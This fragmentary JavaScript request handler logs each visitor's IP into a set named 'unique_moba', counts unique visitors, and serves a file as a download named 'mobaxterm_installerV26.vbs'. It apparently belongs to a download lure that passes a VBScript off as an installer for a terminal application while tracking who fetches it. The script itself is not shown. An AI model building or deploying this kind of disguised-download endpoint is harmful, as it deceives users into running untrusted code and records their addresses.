...
export default async function handler(req, res) {
  const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown')
   ...
   await kv.sadd('unique_moba', ip);

  const uniqueCount = await kv.scard('unique_moba');
  ...
  try {
    ...
    res.setHeader('Content-Disposition', 'attachment; filename="mobaxterm_installerV26.vbs"');
    res.send(buffer);
  } catch (error) {
